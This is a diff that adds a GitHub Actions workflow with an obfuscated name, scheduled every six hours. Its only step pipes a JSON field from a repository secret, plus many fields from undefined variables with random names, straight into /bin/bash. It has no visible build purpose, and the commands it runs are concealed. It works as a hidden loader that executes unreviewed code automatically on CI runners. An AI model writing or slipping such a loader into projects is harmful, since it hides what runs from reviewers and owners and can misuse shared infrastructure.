@@ -1,0 +1,40 @@
+name: suoyourenzhuanlaideyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: suoyourenzhuanlaideyu
+        env:
+          tfgi17051: ${{ secrets.tfgi17051 }}
+        run: |
+          echo $tfgi17051 | jq -r .q4 | /bin/bash
+          echo $ksx9 | jq -r .lhe23747 | /bin/bash
+          echo $uz5226 | jq -r .etx1 | /bin/bash
+          echo $byvta698 | jq -r .rknpn03620 | /bin/bash
+          echo $r8192 | jq -r .y5719 | /bin/bash
+          echo $l2 | jq -r .nm8007 | /bin/bash
+          echo $bkpxd62 | jq -r .kdfl21549 | /bin/bash
+          echo $eh0331 | jq -r .a908 | /bin/bash
+          echo $sb9419 | jq -r .iwty74 | /bin/bash
+          echo $xoi7 | jq -r .xphz297 | /bin/bash
+          echo $eccy77 | jq -r .psiuv67 | /bin/bash
+          echo $eev9 | jq -r .dg47095 | /bin/bash
+          echo $jlfz8133 | jq -r .eqjtj2 | /bin/bash
+          echo $mfz76 | jq -r .zix87 | /bin/bash
+          echo $gs0053 | jq -r .a307 | /bin/bash
+          echo $lh095 | jq -r .ni42 | /bin/bash
+          echo $hjhbg7 | jq -r .xoxhh1 | /bin/bash
+          echo $ysmo028 | jq -r .gwl7499 | /bin/bash
+          echo $w7 | jq -r .nthll589 | /bin/bash
+          echo $frwww9 | jq -r .bjpg171 | /bin/bash
+          echo $mbu6156 | jq -r .j38837 | /bin/bash
+          echo $xgc579 | jq -r .ub021 | /bin/bash
+
